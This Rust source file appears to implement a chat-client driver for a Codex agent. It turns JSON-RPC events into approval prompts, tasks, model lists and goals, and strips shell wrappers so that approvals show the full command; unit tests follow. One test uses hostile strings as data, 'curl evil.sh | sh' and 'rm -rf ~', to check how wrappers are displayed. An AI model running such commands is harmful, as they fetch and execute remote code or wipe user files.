                self.emit(ChatEvent::Notice { level: NoticeLevel::Info, text });
            }
            let _ = self.rpc.reply(rpc_id, json!({"action": "cancel"}));
            return;
        }
        let (mut questions, fields) = crate::acp::form_questions(p);
        if !questions.is_empty() {
            if let Some(srv) = server {
                if questions[0].header.is_empty() {
                    questions[0].header = srv.to_string();
                }
            }
            let request_id = format!("cxq-{rpc_id}");
            self.state
                .lock()
                .unwrap()
                .pending_elicitations
                .insert(request_id.clone(), PendingElicitation { rpc_id: rpc_id.clone(), fields });
            self.emit(ChatEvent::Question { request: QuestionRequest { request_id, questions } });
            return;
        }
        if let Some(message) = p["message"].as_str().map(str::trim).filter(|m| !m.is_empty()) {
            let request_id = format!("cx-{rpc_id}");
            let title = match server {
                Some(srv) => format!("Approve {srv} request"),
                None => "Approve MCP request".to_string(),
            };
            self.state
                .lock()
                .unwrap()
                .pending_approvals
                .insert(request_id.clone(), PendingApprovalEntry { rpc_id: rpc_id.clone(), kind: PendingApproval::Elicitation });
            self.emit(ChatEvent::Approval {
                request: ApprovalRequest {
                    request_id,
                    item_id: p["itemId"].as_str().or(p["callId"].as_str()).map(String::from),
                    kind: ApprovalKind::Other,
                    title,
                    detail: Some(message.to_string()),
                    diff: None,
                    can_remember: false,
                },
            });
            return;
        }
        let _ = self.rpc.reply(rpc_id, json!({"action": "accept", "content": {}}));
    }

    fn approval(&mut self, rpc_id: &Value, method: &str, p: &Value) {
        let item_id = p["itemId"].as_str().or(p["callId"].as_str()).map(String::from);
        let request_id = format!("cx-{}", rpc_id);
        let (kind, title, detail, diff, pending) = if method.contains("ommand") {
            let cmd = p["command"]
                .as_str()
                .map(strip_shell)
                .or_else(|| p["command"].as_array().map(|a| a.iter().filter_map(|x| x.as_str()).collect::<Vec<_>>().join(" ")));
            (
                ApprovalKind::Command,
                "Run a command".to_string(),
                cmd.or_else(|| p["reason"].as_str().map(String::from)),
                None,
                PendingApproval::Decision,
            )
        } else if method.contains("fileChange") || method.contains("Patch") {
            let diffs = item_id.as_ref().and_then(|i| self.state.lock().unwrap().changes.get(i).cloned()).unwrap_or_default();
            let title = match diffs.as_slice() {
                [one] => format!("Edit {}", one.path),
                [] => "Edit files".into(),
                many => format!("Edit {} files", many.len()),
            };
            (ApprovalKind::Edit, title, p["reason"].as_str().map(String::from), merge(diffs), PendingApproval::Decision)
        } else if method.contains("permissions") {
            let reason = p["reason"].as_str().map(str::trim).filter(|r| !r.is_empty());
            let detail = join_detail(reason, crate::acp::input_summary(&p["permissions"]));
            (ApprovalKind::Other, "Grant permissions".into(), detail, None, PendingApproval::Permissions(p["permissions"].clone()))
        } else {
            let cached = item_id.as_ref().and_then(|i| self.state.lock().unwrap().tools_by_item_id.get(i).cloned());
            let server = p["server"].as_str().or(p["serverName"].as_str()).map(str::trim).filter(|s| !s.is_empty());
            let tool = p["tool"].as_str().or(p["toolName"].as_str()).map(str::trim).filter(|t| !t.is_empty());
            let title = match (server, tool) {
                (Some(srv), Some(t)) => format!("Use {srv} · {t}"),
                (None, Some(t)) => format!("Use {t}"),
                _ => match cached.as_ref().filter(|t| !t.title.is_empty()) {
                    Some(t) => format!("Use {}", t.title),
                    None => "Use MCP tool".to_string(),
                },
            };
            let args = if !p["arguments"].is_null() {
                &p["arguments"]
            } else if !p["input"].is_null() {
                &p["input"]
            } else {
                cached.as_ref().map(|t| &t.input).unwrap_or(&Value::Null)
            };
            let reason = p["reason"].as_str().map(str::trim).filter(|r| !r.is_empty());
            let detail = join_detail(reason, crate::acp::input_summary(args));
            (ApprovalKind::Other, title, detail, None, PendingApproval::Decision)
        };
        self.state
            .lock()
            .unwrap()
            .pending_approvals
            .insert(request_id.clone(), PendingApprovalEntry { rpc_id: rpc_id.clone(), kind: pending });
        self.emit(ChatEvent::Approval { request: ApprovalRequest { request_id, item_id, kind, title, detail, diff, can_remember: true } });
    }
}

fn approval_reply(kind: &PendingApproval, decision: Decision) -> Value {
    match kind {
        PendingApproval::Decision => {
            let d = match decision {
                Decision::Allow => "accept",
                Decision::AllowAlways => "acceptForSession",
                Decision::Deny => "decline",
            };
            json!({"decision": d})
        }
        PendingApproval::Elicitation => match decision {
            Decision::Deny => json!({"action": "decline"}),
            Decision::Allow | Decision::AllowAlways => json!({"action": "accept", "content": {}}),
        },
        PendingApproval::Permissions(perms) => match decision {
            Decision::Allow => json!({"permissions": perms, "scope": "turn"}),
            Decision::AllowAlways => json!({"permissions": perms, "scope": "session"}),
            Decision::Deny => json!({"permissions": {}, "scope": "turn"}),
        },
    }
}

fn join_detail(reason: Option<&str>, summary: Option<String>) -> Option<String> {
    match (reason, summary) {
        (Some(r), Some(s)) => Some(format!("{r}\n{s}")),
        (Some(r), None) => Some(r.to_string()),
        (None, s) => s,
    }
}

/// `model/list` → the picker's options (hidden models left out).
/// `skills/list` → the / menu's skills: `{data: [{cwd, skills: [{name, description,
/// shortDescription, interface: {shortDescription}, enabled}]}]}`, turned-off ones left out.
pub fn parse_skills(v: &Value) -> Vec<SlashCommand> {
    let mut seen = std::collections::HashSet::new();
    v["data"]
        .as_array()
        .into_iter()
        .flatten()
        .flat_map(|e| e["skills"].as_array().into_iter().flatten())
        .filter(|k| k["enabled"].as_bool() != Some(false))
        .filter_map(|k| {
            let name = k["name"].as_str()?.to_string();
            let description = [&k["interface"]["shortDescription"], &k["shortDescription"], &k["description"]]
                .into_iter()
                .find_map(|d| d.as_str().filter(|d| !d.trim().is_empty()))
                .unwrap_or("")
                .to_string();
            seen.insert(name.clone()).then_some(SlashCommand { name, description, hint: String::new(), skill: true })
        })
        .collect()
}

pub fn parse_models(v: &Value) -> Vec<ModelOption> {
    models_with_speed(v, false, None)
}

/// Use the signed-in server's catalog and effective feature flags, as Codex's own picker does.
pub fn catalog(mut call: impl FnMut(&str, Value) -> DriverResult<Value>, cwd: &str) -> DriverResult<(Vec<ModelOption>, Vec<SlashCommand>)> {
    let list = call("model/list", json!({"limit": 100, "includeHidden": false}))?;
    let account = call("account/read", json!({})).unwrap_or_default();
    let features = call("experimentalFeature/list", json!({"limit": 500})).unwrap_or_default();
    let config = call("config/read", json!({"cwd": cwd})).unwrap_or_default();
    // API-key sessions can list bundled models even when the API project restricts priority.
    let fast_available = account["account"]["type"] == "chatgpt"
        && matches!(config["config"]["model_provider"].as_str(), None | Some("openai"))
        && features["data"].as_array().is_some_and(|rows| rows.iter().any(|f| f["name"] == "fast_mode" && f["enabled"] == true))
        && config["config"].is_object()
        && config["config"]["features"]["fast_mode"] != false;
    let models = models_with_speed(&list, fast_available, config["config"]["service_tier"].as_str());
    let commands = call("skills/list", json!({"cwds": [cwd]})).map(|v| parse_skills(&v)).unwrap_or_default();
    Ok((models, commands))
}

fn models_with_speed(v: &Value, fast_available: bool, configured_tier: Option<&str>) -> Vec<ModelOption> {
    v["data"]
        .as_array()
        .into_iter()
        .flatten()
        .filter(|m| !m["hidden"].as_bool().unwrap_or(false))
        .map(|m| ModelOption {
            id: m["model"].as_str().or(m["id"].as_str()).unwrap_or("").into(),
            name: m["displayName"].as_str().or(m["model"].as_str()).unwrap_or("").into(),
            description: m["description"].as_str().unwrap_or("").into(),
            efforts: m["supportedReasoningEfforts"]
                .as_array()
                .into_iter()
                .flatten()
                .filter_map(|e| e["reasoningEffort"].as_str().or(e.as_str()).map(String::from))
                .collect(),
            fast_mode: (fast_available
                && m["serviceTiers"].as_array().is_some_and(|tiers| {
                    tiers.iter().any(|t| t["id"] == "priority" && t["name"].as_str().is_some_and(|s| s.eq_ignore_ascii_case("fast")))
                }))
            .then(|| configured_tier.or(m["defaultServiceTier"].as_str()) == Some("priority")),
            default_effort: m["defaultReasoningEffort"].as_str().map(String::from),
        })
        .collect()
}

fn collab_title(item: &Value) -> String {
    item["prompt"].as_str().and_then(|p| p.lines().find(|l| !l.trim().is_empty())).unwrap_or("Subagent").trim().to_string()
}

/// The first non-empty line, at most 160 characters: a task's detail.
fn first_line(text: &str) -> String {
    let line = text.lines().find(|l| !l.trim().is_empty()).unwrap_or("").trim();
    match line.char_indices().nth(160) {
        Some((i, _)) => format!("{}…", &line[..i]),
        None => line.to_string(),
    }
}

pub fn goal_request(thread_id: &str, command: GoalCommand<'_>) -> (&'static str, Value) {
    let mut params = json!({"threadId": thread_id, "origin": "user"});
    let method = match command {
        GoalCommand::Set(objective) => {
            params["objective"] = json!(objective);
            params["status"] = json!("active");
            "thread/goal/set"
        }
        GoalCommand::Pause | GoalCommand::Resume => {
            params["status"] = json!(if matches!(command, GoalCommand::Pause) { "paused" } else { "active" });
            "thread/goal/set"
        }
        GoalCommand::Clear => "thread/goal/clear",
    };
    (method, params)
}

pub fn parse_goal(v: &Value) -> Option<Goal> {
    let goal: Goal = serde_json::from_value(v.clone()).ok()?;
    (!goal.objective.trim().is_empty()).then_some(goal)
}

fn s(v: &Value) -> String {
    v.as_str().unwrap_or("").to_string()
}

fn clip(mut out: String) -> String {
    if out.len() > MAX_OUTPUT {
        let mut cut = MAX_OUTPUT;
        while !out.is_char_boundary(cut) {
            cut -= 1;
        }
        out.truncate(cut);
        out.push_str("\n…");
    }
    out
}

/// One diff for the card: a single file as is, several concatenated under the first's path.
fn merge(diffs: Vec<FileDiff>) -> Option<FileDiff> {
    match diffs.len() {
        0 => None,
        1 => diffs.into_iter().next(),
        _ => {
            let path = format!("{} (+{} more)", diffs[0].path, diffs.len() - 1);
            let patch = diffs.iter().map(|d| format!("@@ {} @@\n{}", d.path, d.patch)).collect::<String>();
            Some(FileDiff::from_patch(path, patch))
        }
    }
}

/// `"pwsh.exe" -Command 'Get-Content a.txt'` / `bash -lc 'ls'` → the inner command.
///
/// Only a whole wrapper comes off: a known shell first, then its flags ending in `-c`, `-lc`
/// or `-Command`, then one quoted word that runs to the end. Anything else (a `-c` in the
/// middle, text after the quoted word) shows as it is, so an approval never shows less than
/// what runs.
pub fn strip_shell(cmd: &str) -> String {
    inner_command(cmd.trim()).unwrap_or_else(|| cmd.to_string())
}

fn inner_command(cmd: &str) -> Option<String> {
    // The program: "C:\path with spaces\pwsh.exe" or a bare word.
    let (program, rest) = match cmd.strip_prefix('"') {
        Some(r) => {
            let end = r.find('"')?;
            (&r[..end], &r[end + 1..])
        }
        None => cmd.split_at(cmd.find(char::is_whitespace)?),
    };
    let name = program.rsplit(['/', '\\']).next()?.to_ascii_lowercase();
    if !matches!(name.strip_suffix(".exe").unwrap_or(&name), "bash" | "sh" | "zsh" | "dash" | "pwsh" | "powershell") {
        return None;
    }
    // Flags, up to and including the one that takes the command.
    let mut rest = rest.trim_start();
    loop {
        let (flag, after) = rest.split_at(rest.find(char::is_whitespace)?);
        if !flag.starts_with('-') {
            return None;
        }
        rest = after.trim_start();
        if matches!(flag.to_ascii_lowercase().as_str(), "-c" | "-lc" | "-command") {
            break;
        }
    }
    // One quoted word, and nothing after it.
    let rest = rest.trim_end();
    if let Some(body) = rest.strip_prefix('\'').and_then(|r| r.strip_suffix('\'')) {
        // A quote inside is written '\'' (close, escaped quote, reopen).
        let parts: Vec<&str> = body.split("'\\''").collect();
        return parts.iter().all(|p| !p.contains('\'')).then(|| parts.join("'"));
    }
    if let Some(body) = rest.strip_prefix('"').and_then(|r| r.strip_suffix('"')) {
        let mut escaped = false;
        for c in body.chars() {
            match c {
                '"' if !escaped => return None,
                '\\' => escaped = !escaped,
                _ => escaped = false,
            }
        }
        return Some(body.to_string());
    }
    None
}

/// A command that only reads or searches shows as such.
fn command_kind(item: &Value) -> ToolKind {
    let actions = item["commandActions"].as_array();
    match actions.map(|a| a.iter().map(|x| x["type"].as_str().unwrap_or("")).collect::<Vec<_>>()) {
        Some(types) if !types.is_empty() && types.iter().all(|t| *t == "read") => ToolKind::Read,
        Some(types) if !types.is_empty() && types.iter().all(|t| *t == "search" || *t == "listFiles") => ToolKind::Search,
        _ => ToolKind::Bash,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn goal_controls_keep_the_native_objective_on_pause_and_resume() {
        let (method, new) = goal_request("thread", GoalCommand::Set("Verify tests"));
        assert_eq!(method, "thread/goal/set");
        assert_eq!(new, json!({"threadId": "thread", "origin": "user", "objective": "Verify tests", "status": "active"}));
        for (action, status) in [(GoalCommand::Pause, "paused"), (GoalCommand::Resume, "active")] {
            let (method, request) = goal_request("thread", action);
            assert_eq!(method, "thread/goal/set");
            assert_eq!(request, json!({"threadId": "thread", "origin": "user", "status": status}));
        }
        assert_eq!(goal_request("thread", GoalCommand::Clear).0, "thread/goal/clear");
        let goal =
            parse_goal(&json!({"objective": "Verify tests", "status": "budgetLimited", "tokensUsed": 4000, "tokenBudget": 4000})).unwrap();
        assert_eq!(goal.status, moonfish_core::chats::GoalStatus::BudgetLimited);
        assert_eq!(goal.tokens_used, Some(4000));
    }

    fn run(lines: &[Value]) -> (Vec<ChatEvent>, Arc<Mutex<State>>) {
        let out = Arc::new(Mutex::new(Vec::new()));
        let o = out.clone();
        let sink: Sink = Arc::new(move |e| o.lock().unwrap().push(e));
        let state = Arc::new(Mutex::new(State { alive: true, ..Default::default() }));
        let rpc = Rpc::new(None, "Codex");
        let mut tr = Translator { sink, state: state.clone(), rpc };
        for l in lines {
            tr.handle(l);
        }
        let v = out.lock().unwrap().clone();
        (v, state)
    }

    /// Exercise the actual send path across mode changes on one live thread. `cat`
    /// echoes JSON-RPC requests so the peer can capture and acknowledge them.
    #[cfg(unix)]
    #[test]
    fn permission_changes_update_approvals_and_sandbox_on_the_same_thread() {
        use std::sync::mpsc;

        let loc = moonfish_core::settings::Location::Local;
        let mut child = moonfish_transport::spawn(&Spec { location: &loc, cwd: "/", program: "cat", args: vec![], env: &[] }).unwrap();
        let stdout = child.stdout.take().unwrap();
        let rpc = Rpc::new(child.stdin.take(), "test peer");
        let peer = rpc.clone();
        let (tx, rx) = mpsc::channel();
        let reader = thread::spawn(move || {
            for line in BufReader::new(stdout).lines().map_while(Result::ok) {
                let request: Value = serde_json::from_str(&line).unwrap();
                if request["params"]["input"][0]["text"] == "reject" {
                    peer.take_reply(&json!({"id": request["id"], "error": {"message": "rejected"}}));
                } else {
                    peer.take_reply(&json!({"id": request["id"], "result": {}}));
                }
                if tx.send(request).is_err() {
                    break;
                }
            }
        });
        let events = Arc::new(Mutex::new(Vec::new()));
        let captured = events.clone();
        let mut driver = CodexDriver {
            rpc,
            child: Arc::new(Mutex::new(Some(child))),
            state: Arc::new(Mutex::new(State { alive: true, thread_id: Some("existing-thread".into()), ..Default::default() })),
            sink: Arc::new(move |event| captured.lock().unwrap().push(event)),
            permission: PermissionMode::Ask,
            permission_changed: false,
            goal_options_changed: false,
            model: None,
            effort: None,
            fast_mode: None,
        };
        let mut send = |mode, expected: Option<(&str, &str)>| {
            driver.set_permission(mode).unwrap();
            driver.send(Prompt { id: "p".into(), text: "continue".into(), images: vec![], files: vec![] }).unwrap();
            let request = rx.recv_timeout(Duration::from_secs(5)).expect("driver sent a request");
            assert_eq!(request["method"], "turn/start");
            let params = &request["params"];
            assert_eq!(params["threadId"], "existing-thread");
            if let Some((approval, sandbox)) = expected {
                assert_eq!(params["approvalPolicy"], approval);
                assert_eq!(params["sandboxPolicy"]["type"], sandbox);
                if sandbox == "workspaceWrite" {
                    assert_eq!(params["sandboxPolicy"]["networkAccess"], false);
                }
            } else {
                assert!(params.get("sandboxPolicy").is_none(), "unchanged modes inherit the server's resolved sandbox");
            }
        };
        send(PermissionMode::Ask, None);
        send(PermissionMode::FullAccess, Some(("never", "dangerFullAccess")));
        send(PermissionMode::FullAccess, Some(("never", "dangerFullAccess")));
        send(PermissionMode::Ask, Some(("untrusted", "workspaceWrite")));
        send(PermissionMode::Plan, Some(("on-request", "readOnly")));
        send(PermissionMode::AcceptEdits, Some(("on-request", "workspaceWrite")));
        // A turn with no selection inherits. Switching off explicitly clears priority.
        for (fast, tier) in [(None, None), (Some(true), Some("priority")), (Some(false), Some("default"))] {
            driver.set_fast_mode(fast).unwrap();
            driver.send(Prompt { id: "p".into(), text: "continue".into(), images: vec![], files: vec![] }).unwrap();
            let request = rx.recv_timeout(Duration::from_secs(5)).unwrap();
            assert_eq!(request["params"]["serviceTier"].as_str(), tier);
        }
        // A queued prompt rejected by the server stays out of the transcript until a retry succeeds.
        events.lock().unwrap().clear();
        let queued = |text: &str| Prompt { id: "queued".into(), text: text.into(), images: vec![], files: vec![] };
        assert_eq!(driver.send(queued("reject")).unwrap_err(), "rejected");
        assert_eq!(rx.recv_timeout(Duration::from_secs(5)).unwrap()["method"], "turn/start");
        driver.state.lock().unwrap().turn_id = Some("active".into());
        assert_eq!(driver.send(queued("reject")).unwrap_err(), "rejected");
        assert_eq!(rx.recv_timeout(Duration::from_secs(5)).unwrap()["method"], "turn/steer");
        assert!(events.lock().unwrap().is_empty());
        driver.send(queued("retry")).unwrap();
        assert_eq!(rx.recv_timeout(Duration::from_secs(5)).unwrap()["method"], "turn/steer");
        assert!(matches!(&events.lock().unwrap()[..], [ChatEvent::UserMessage { id, .. }] if id == "queued"));
        driver.stop();
        reader.join().unwrap();
    }

    #[test]
    fn catalog_speed_requires_account_feature_and_model() {
        for (account, feature, configured, expected) in [
            (json!({"type":"chatgpt"}), true, "priority", Some(true)),
            (json!({"type":"chatgpt"}), true, "default", Some(false)),
            (json!({"type":"chatgpt"}), false, "default", None),
            (json!(null), true, "default", None),
            (json!({"type":"apiKey"}), true, "default", None),
        ] {
            let (models, _) = catalog(|method, _| Ok(match method {
                "model/list" => json!({"data":[{"model":"a","serviceTiers":[{"id":"priority","name":"Fast"}]}, {"model":"b","serviceTiers":[{"id":"ultrafast","name":"Ultrafast"}]}, {"model":"c"}]}),
                "account/read" => json!({"account":account}),
                "experimentalFeature/list" => json!({"data":[{"name":"fast_mode","enabled":feature}]}),
                "config/read" => json!({"config":{"service_tier":configured}}),
                _ => Value::Null,
            }), "/project").unwrap();
            assert_eq!(models.iter().map(|m| m.fast_mode).collect::<Vec<_>>(), [expected, None, None]);
        }
    }

    fn task_lists(ev: &[ChatEvent]) -> Vec<Vec<BackgroundTask>> {
        ev.iter().filter_map(|e| if let ChatEvent::Tasks { tasks } = e { Some(tasks.clone()) } else { None }).collect()
    }

    #[test]
    fn a_terminal_left_running_is_background_work() {
        let (ev, _) = run(&[
            json!({"method":"turn/started","params":{"threadId":"t","turn":{"id":"T1"}}}),
            json!({"method":"item/started","params":{"threadId":"t","item":{"type":"commandExecution","id":"c1","command":"/bin/bash -lc 'npm run dev'","processId":"p1","source":"unifiedExecStartup","status":"inProgress"}}}),
            json!({"method":"item/started","params":{"threadId":"t","item":{"type":"commandExecution","id":"c2","command":"ls","processId":"p2","source":"unifiedExecStartup","status":"inProgress"}}}),
            json!({"method":"item/completed","params":{"threadId":"t","item":{"type":"commandExecution","id":"c2","command":"ls","status":"completed","exitCode":0}}}),
            json!({"method":"turn/completed","params":{"threadId":"t","turn":{"id":"T1","status":"completed"}}}),
            json!({"method":"item/completed","params":{"threadId":"t","item":{"type":"commandExecution","id":"c1","command":"x","status":"failed","exitCode":1,"aggregatedOutput":"boom"}}}),
        ]);
        let lists = task_lists(&ev);
        assert_eq!(lists.len(), 2);
        assert_eq!((lists[0].len(), lists[0][0].title.as_str(), lists[0][0].status), (1, "npm run dev", TaskStatus::Running));
        assert_eq!(lists[0][0].item_id.as_deref(), Some("c1"));
        assert_eq!((lists[1][0].status, lists[1][0].detail.as_deref()), (TaskStatus::Failed, Some("exit code 1")));
        // Listed before the turn ends, so the turn's end doesn't settle the command as cut off.
        let at = |f: fn(&ChatEvent) -> bool| ev.iter().position(f).unwrap();
        assert!(at(|e| matches!(e, ChatEvent::Tasks { .. })) < at(|e| matches!(e, ChatEvent::TurnFinished { .. })));
        assert!(ev.iter().any(|e| matches!(e, ChatEvent::Notice { text, .. } if text.contains("npm run dev"))));
    }

    #[test]
    fn subagents_are_tasks_and_their_threads_stay_out_of_the_chat() {
        let (ev, state) = run(&[
            json!({"method":"turn/started","params":{"threadId":"t","turn":{"id":"T1"}}}),
            json!({"method":"item/completed","params":{"threadId":"t","item":{"type":"collabAgentToolCall","id":"s1","tool":"spawnAgent","status":"completed","senderThreadId":"t","receiverThreadIds":["sub"],"prompt":"Check the release workflow\nthen report","agentsStates":{"sub":{"status":"running","message":null}}}}}),
            json!({"method":"turn/started","params":{"threadId":"sub","turn":{"id":"S1"}}}),
            json!({"method":"item/completed","params":{"threadId":"sub","item":{"type":"agentMessage","id":"m","text":"CI is green."}}}),
            json!({"method":"turn/completed","params":{"threadId":"t","turn":{"id":"T1","status":"completed"}}}),
            json!({"method":"turn/completed","params":{"threadId":"sub","turn":{"id":"S1","status":"completed"}}}),
        ]);
        let lists = task_lists(&ev);
        assert_eq!(
            (lists[0][0].kind, lists[0][0].title.as_str(), lists[0][0].background),
            (TaskKind::Agent, "Check the release workflow", false)
        );
        // Promoted to background when the parent turn completes while it is still running.
        assert_eq!((lists[2][0].status, lists[2][0].background), (TaskStatus::Running, true));
        let last = lists.last().unwrap();
        assert_eq!((last[0].status, last[0].detail.as_deref(), last[0].background), (TaskStatus::Completed, Some("CI is green."), true));
        assert_eq!(state.lock().unwrap().tasks.running(), 0);
        // One turn in this chat; the subagent's text isn't its text.
        assert_eq!(ev.iter().filter(|e| matches!(e, ChatEvent::TurnStarted { .. })).count(), 1);
        assert_eq!(ev.iter().filter(|e| matches!(e, ChatEvent::TurnFinished { .. })).count(), 1);
        assert!(!ev.iter().any(|e| matches!(e, ChatEvent::Text { .. })));
        assert!(ev.iter().any(|e| matches!(e, ChatEvent::Notice { text, .. } if text.contains("Check the release workflow"))));
    }

    #[test]
    fn in_turn_subagent_updates_and_promotes_on_turn_end() {
        let out = Arc::new(Mutex::new(Vec::new()));
        let o = out.clone();
        let sink: Sink = Arc::new(move |e| o.lock().unwrap().push(e));
        let state = Arc::new(Mutex::new(State { alive: true, ..Default::default() }));
        let mut tr = Translator { sink, state: state.clone(), rpc: Rpc::new(None, "Codex") };

        tr.handle(&json!({"method":"turn/started","params":{"threadId":"t","turn":{"id":"T1"}}}));
        tr.handle(&json!({
            "method": "item/started",
            "params": {"threadId": "t", "item": {
                "type": "collabAgentToolCall", "id": "s1", "tool": "spawnAgent", "status": "inProgress",
                "senderThreadId": "t", "receiverThreadIds": ["sub1"], "prompt": "Audit auth"
            }}
        }));
        tr.handle(&json!({
            "method": "item/started",
            "params": {"threadId": "t", "item": {
                "type": "collabAgentToolCall", "id": "s2", "tool": "spawnAgent", "status": "inProgress",
                "senderThreadId": "t", "receiverThreadIds": ["sub2"], "prompt": "Watch build"
            }}
        }));
        // Neither in-turn subagent counts as background work.
        assert_eq!(state.lock().unwrap().tasks.running(), 0);

        tr.handle(&json!({
            "method": "item/completed",
            "params": {"threadId": "t", "item": {
                "type": "collabAgentToolCall", "id": "w1", "tool": "wait", "status": "completed",
                "receiverThreadIds": ["sub1"], "agentsStates": {"sub1": {"status": "running", "message": "Reading src/auth.rs"}}
            }}
        }));
        tr.handle(&json!({
            "method": "item/completed",
            "params": {"threadId": "t", "item": {
                "type": "collabAgentToolCall", "id": "c1", "tool": "closeAgent", "status": "completed",
                "receiverThreadIds": ["sub1"]
            }}
        }));
        assert_eq!(state.lock().unwrap().tasks.running(), 0);

        // `sub2` outlives the turn and gets promoted to background work.
        tr.handle(&json!({"method":"turn/completed","params":{"threadId":"t","turn":{"id":"T1","status":"completed"}}}));
        assert_eq!(state.lock().unwrap().tasks.running(), 1);

        let ev = out.lock().unwrap().clone();
        let lists = task_lists(&ev);
        let last = lists.last().unwrap();
        let sub1 = last.iter().find(|t| t.id == "sub1").unwrap();
        let sub2 = last.iter().find(|t| t.id == "sub2").unwrap();
        assert_eq!(
            (sub1.status, sub1.detail.as_deref(), sub1.background, sub1.item_id.as_deref()),
            (TaskStatus::Stopped, Some("Reading src/auth.rs"), false, Some("s1"))
        );
        assert_eq!((sub2.status, sub2.background, sub2.item_id.as_deref()), (TaskStatus::Running, true, Some("s2")));
        let started_task =
            ev.iter().any(|e| matches!(e, ChatEvent::ToolStarted { item_id, tool } if item_id == "s1" && tool.kind == ToolKind::Task));
        assert!(started_task);
        assert!(!ev.iter().any(|e| matches!(e, ChatEvent::Notice { .. })));
    }

    #[test]
    fn translates_a_turn() {
        let (ev, state) = run(&[
            json!({"method":"turn/started","params":{"turn":{"id":"T1"}}}),
            json!({"method":"item/agentMessage/delta","params":{"itemId":"m1","delta":"I'll"}}),
            json!({"method":"item/completed","params":{"item":{"type":"agentMessage","id":"m1","text":"I'll edit it."}}}),
            json!({"method":"item/started","params":{"item":{"type":"commandExecution","id":"c1","command":"\"pwsh.exe\" -Command 'Get-Content -LiteralPath a.txt'","commandActions":[{"type":"read"}],"status":"inProgress"}}}),
            json!({"method":"item/completed","params":{"item":{"type":"commandExecution","id":"c1","command":"x","status":"completed","exitCode":0,"aggregatedOutput":"hello\r\n"}}}),
            json!({"method":"item/started","params":{"item":{"type":"fileChange","id":"f1","changes":[{"path":"a.txt","kind":{"type":"update"},"diff":"@@ -1 +1 @@\n-hello\n+hello world\n"}],"status":"inProgress"}}}),
            json!({"method":"item/fileChange/requestApproval","id":7,"params":{"itemId":"f1","threadId":"t","turnId":"T1"}}),
            json!({"method":"thread/tokenUsage/updated","params":{"tokenUsage":{"last":{"totalTokens":20184,"inputTokens":20130,"cachedInputTokens":12416,"cacheWriteInputTokens":0,"outputTokens":54},"modelContextWindow":258400}}}),
            json!({"method":"turn/completed","params":{"turn":{"id":"T1","status":"completed","durationMs":9000}}}),
        ]);
        assert!(matches!(&ev[0], ChatEvent::TurnStarted { turn_id } if turn_id == "T1"));
        assert!(matches!(&ev[1], ChatEvent::TextDelta { item_id, .. } if item_id == "m1"));
        assert!(matches!(&ev[2], ChatEvent::Text { text, .. } if text == "I'll edit it."));
        assert!(
            matches!(&ev[3], ChatEvent::ToolStarted { tool, .. } if tool.kind == ToolKind::Read && tool.title == "Get-Content -LiteralPath a.txt")
        );
        assert!(matches!(&ev[4], ChatEvent::ToolFinished { ok: true, .. }));
        assert!(matches!(&ev[5], ChatEvent::ToolStarted { tool, .. } if tool.kind == ToolKind::Edit && tool.title == "a.txt"));
        match &ev[6] {
            ChatEvent::Approval { request } => {
                assert_eq!(request.request_id, "cx-7");
                assert_eq!(request.title, "Edit a.txt");
                assert_eq!(request.diff.as_ref().unwrap().added, 1);
            }
            e => panic!("{e:?}"),
        }
        assert!(state.lock().unwrap().pending_approvals.is_empty(), "the turn ending drops unanswered questions");
        assert!(matches!(&ev[7], ChatEvent::Context { used_tokens: 20184, window_tokens: 258400, .. }));
        match &ev[8] {
            ChatEvent::TurnFinished { usage: Some(u), duration_ms: Some(9000), interrupted: false, .. } => {
                assert_eq!((u.input_tokens, u.cache_read_tokens, u.output_tokens), (7714, 12416, 54));
            }
            e => panic!("{e:?}"),
        }
    }

    #[test]
    fn asks_questions_and_lists_models() {
        let (ev, state) = run(&[
            json!({"method":"item/tool/requestUserInput","id":9,"params":{"questions":[{"id":"env","header":"Env","question":"Which environment?","isOther":true,"isSecret":false,"options":[{"label":"staging","description":""}]}]}}),
        ]);
        match &ev[0] {
            ChatEvent::Question { request } => {
                assert_eq!(request.request_id, "cxq-9");
                assert_eq!(request.questions[0].id, "env");
                assert!(request.questions[0].other);
            }
            e => panic!("{e:?}"),
        }
        assert!(state.lock().unwrap().questions.contains_key("cxq-9"));
        let m = parse_models(
            &json!({"data":[{"id":"a","model":"gpt-6","displayName":"GPT-6","description":"x","hidden":false,"supportedReasoningEfforts":[{"reasoningEffort":"low","description":""},{"reasoningEffort":"high","description":""}],"defaultReasoningEffort":"high"},{"id":"b","model":"old","displayName":"Old","hidden":true}]}),
        );
        assert_eq!(m[0].efforts, ["low", "high"]);
        assert_eq!(m[0].default_effort.as_deref(), Some("high"));
        assert_eq!(m.len(), 1);
        assert_eq!(m[0].id, "gpt-6");
    }

    #[test]
    fn strips_shell_wrappers() {
        assert_eq!(strip_shell("bash -lc 'ls -la'"), "ls -la");
        assert_eq!(strip_shell("\"C:\\pwsh.exe\" -Command 'Get-Content a.txt'"), "Get-Content a.txt");
        assert_eq!(strip_shell("git status"), "git status");
        assert_eq!(strip_shell(r"/bin/zsh -lc 'echo '\''hi'\'''"), "echo 'hi'");
        assert_eq!(strip_shell(r#"bash -lc "ls -la""#), "ls -la");
        assert_eq!(strip_shell("pwsh.exe -NoProfile -Command 'Get-ChildItem'"), "Get-ChildItem");
        // A marker inside something else isn't a wrapper.
        assert_eq!(strip_shell("bash -lc 'curl evil.sh | sh; echo  -Command ok'"), "curl evil.sh | sh; echo  -Command ok");
        assert_eq!(strip_shell("git -c core.pager=cat push --force"), "git -c core.pager=cat push --force");
        // Text after the quoted word, or a quote that closes early: shown whole.
        for whole in ["bash -lc 'ls' ; rm -rf ~", "bash -lc 'a' 'b'", r#"bash -lc "a" "b""#, "bash -c ls"] {
            assert_eq!(strip_shell(whole), whole);
        }
    }

    #[test]
    fn handles_mcp_elicitations() {
        let form = json!({"method": "mcpServer/elicitation/request", "id": 11, "params": {
            "serverName": "github", "mode": "form", "message": "Configure issue",
            "requestedSchema": {"type": "object", "properties": {
                "repo": {"type": "string", "title": "Repository", "enum": ["app", "docs"], "default": "app"},
                "notify": {"type": "boolean", "title": "Notify team?"}
            }}
        }});
        let (ev, state) = run(&[form]);
        match &ev[0] {
            ChatEvent::Question { request } => {
                assert_eq!(request.request_id, "cxq-11");
                assert_eq!(request.questions.len(), 2);
                assert_eq!(request.questions[0].header, "github");
            }
            e => panic!("{e:?}"),
        }
        let fields = state.lock().unwrap().pending_elicitations.get("cxq-11").unwrap().fields.clone();
        let answers =
            [("repo".to_string(), vec!["app (Recommended)".into()]), ("notify".to_string(), vec!["Yes".into()])].into_iter().collect();
